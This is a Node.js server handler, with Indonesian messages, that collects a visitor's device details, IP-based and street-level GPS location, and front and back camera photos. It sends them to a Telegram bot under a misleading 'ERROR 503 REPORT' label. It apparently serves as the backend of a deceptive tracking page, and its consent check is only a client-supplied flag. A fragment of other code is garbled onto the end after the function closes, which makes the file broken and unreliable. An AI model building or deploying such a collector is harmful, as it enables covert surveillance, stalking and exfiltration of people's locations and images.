import { isIP } from "node:net";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({
      success: false,
      message: "Method not allowed"
    });
  }

  try {
    const {
      consent,
      os,
      platform,
      cpu,
      ram,
      resolution,
      browser,
      timezone,
      language,
      latitude,
      longitude,
      accuracy,
      locationStatus,
      frontCamera,
      backCamera,
      frontPhoto,
      backPhoto
    } = req.body || {};

    if (consent !== true) {
      return res.status(403).json({
        success: false,
        message: "Persetujuan diperlukan"
      });
    }

    const TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;

    if (!TOKEN || !CHAT_ID) {
      throw new Error("Environment variables belum diatur");
    }

    // Ambil IP
    const forwarded = req.headers["x-forwarded-for"];
    const candidate = forwarded
      ? forwarded.split(",")[0].trim()
      : req.socket?.remoteAddress || "";

    const ip = isIP(candidate) ? candidate : "Unknown";

    // IP geolocation
    let ipInfo = {};

    if (ip !== "Unknown") {
      try {
        const response = await fetch(
          `https://ipwho.is/${encodeURIComponent(ip)}`,
          { signal: AbortSignal.timeout(7000) }
        );

        const result = await response.json();

        if (result.success) {
          ipInfo = result;
        }
      } catch {}
    }

    // GPS reverse geocoding
    let address = {};

    if (
      Number.isFinite(latitude) &&
      Number.isFinite(longitude) &&
      Math.abs(latitude) <= 90 &&
      Math.abs(longitude) <= 180
    ) {
      try {
        const response = await fetch(
          "https://nominatim.openstreetmap.org/reverse?" +
          new URLSearchParams({
            format: "jsonv2",
            lat: String(latitude),
            lon: String(longitude),
            zoom: "18",
            addressdetails: "1"
          }),
          {
            headers: {
              "User-Agent": "Error503Report/1.0"
            },
            signal: AbortSignal.timeout(7000)
          }
        );

        const result = await response.json();
        address = result.address || {};
      } catch {}
    }

    const locationQuality =
      typeof accuracy === "number"
        ? accuracy < 20 ? "High"
        : accuracy < 100 ? "Medium"
        : "Low"
        : "Tidak tersedia";

    const maps =
      Number.isFinite(latitude) && Number.isFinite(longitude)
        ? `https://www.google.com/maps?q=${latitude},${longitude}`
        : "Tidak tersedia";

    const date = new Date().toLocaleString("sv-SE", {
      timeZone: timezone || "Asia/Jakarta"
    });

    const report = `
🚨 ERROR 503 REPORT

━━━━━━━━━━━━━━━━━━━━
📱 DEVICE INFORMATION
━━━━━━━━━━━━━━━━━━━━
🧠 OS           : ${os || "Unknown"}
💻 Platform     : ${platform || "Unknown"}
⚙️ CPU Cores    : ${cpu || "Unknown"}
💾 RAM          : ${ram || "Unknown"}
🖥 Resolution   : ${resolution || "Unknown"}

🌐 Browser:
${browser || "Unknown"}

🕒 Timezone     : ${timezone || "Unknown"}
🗣 Language     : ${language || "Unknown"}
🌍 Public IP    : ${ip}

━━━━━━━━━━━━━━━━━━━━
🌎 IP INFORMATION
━━━━━━━━━━━━━━━━━━━━
🌍 Country      : ${ipInfo.country || "Unknown"}
📍 Region       : ${ipInfo.region || "Unknown"}
🏙 City         : ${ipInfo.city || "Unknown"}
🏢 ISP / Org    : ${ipInfo.connection?.org || "Unknown"}

━━━━━━━━━━━━━━━━━━━━
🏠 ADDRESS INFORMATION
━━━━━━━━━━━━━━━━━━━━
🏘 Village      : ${address.village || address.suburb || "Unknown"}
🏙 District     : ${address.city_district || address.county || "Unknown"}
🏛 City         : ${address.city || address.town || address.municipality || "Unknown"}
🌆 Province     : ${address.state || "Unknown"}
📮 Postal Code  : ${address.postcode || "Unknown"}
🌍 Country      : ${address.country || "Unknown"}

━━━━━━━━━━━━━━━━━━━━
📐 LOCATION QUALITY
━━━━━━━━━━━━━━━━━━━━
🎯 Quality      : ${locationQuality}
📡 GPS Status   : ${locationStatus || "Unknown"}
🎯 Accuracy     : ${accuracy ? accuracy + " m" : "Unknown"}

🗺 Google Maps:
${maps}

━━━━━━━━━━━━━━━━━━━━
📷 CAMERA INFORMATION
━━━━━━━━━━━━━━━━━━━━
🤳 Front Camera : ${frontCamera || "Unknown"}
📸 Back Camera  : ${backCamera || "Unknown"}

⏰ Time : ${date}
`;

    // Kirim laporan teks
    const messageResponse = await fetch(
      `https://api.telegram.org/bot${TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: report
        })
      }
    );

    const messageResult = await messageResponse.json();

    if (!messageResult.ok) {
      throw new Error("Telegram gagal mengirim laporan teks");
    }

    // Validasi dan kirim foto
    async function sendPhoto(photo, caption) {
      if (
        typeof photo !== "string" ||
        !photo.startsWith("data:image/jpeg;base64,")
      ) {
        return;
      }

      const base64 = photo.split(",")[1];
      const buffer = Buffer.from(base64, "base64");

      if (buffer.length > 1200000) {
        throw new Error("Ukuran foto terlalu besar");
      }

      const form = new FormData();

      form.append("chat_id", CHAT_ID);
      form.append("caption", caption);
      form.append(
        "photo",
        new Blob([buffer], { type: "image/jpeg" }),
        "camera.jpg"
      );

      const response = await fetch(
        `https://api.telegram.org/bot${TOKEN}/sendPhoto`,
        {
          method: "POST",
          body: form
        }
      );

      const result = await response.json();

      if (!result.ok) {
        throw new Error("Telegram gagal mengirim " + caption);
      }
    }

    if (frontPhoto) {
      await sendPhoto(frontPhoto, "📷 Front Camera");
    }

    if (backPhoto) {
      await sendPhoto(backPhoto, "📸 Back Camera");
    }

    return res.status(200).json({
      success: true,
      message: "Laporan berhasil dikirim"
    });

  } catch (error) {
    console.error(error);

    return res.status(500).json({
      success: false,
      message: "Terjadi kesalahan saat mengirim laporan"
    });
  }
}dTelegramPhoto(
                BOT_TOKEN,
                CHAT_ID,
                input.backPhoto,
                "📸 Foto Kamera Belakang - dikonfirmasi pengguna"
            );

        }


        return res.status(200).json({

            success:true,

            message:"Laporan berhasil dikirim"

        });


    }catch(error){

        console.error(error);

        return res.status(500).json({

            success:false,

            message:error.message || "Gagal mengirim laporan"

        });

    }

                                             }
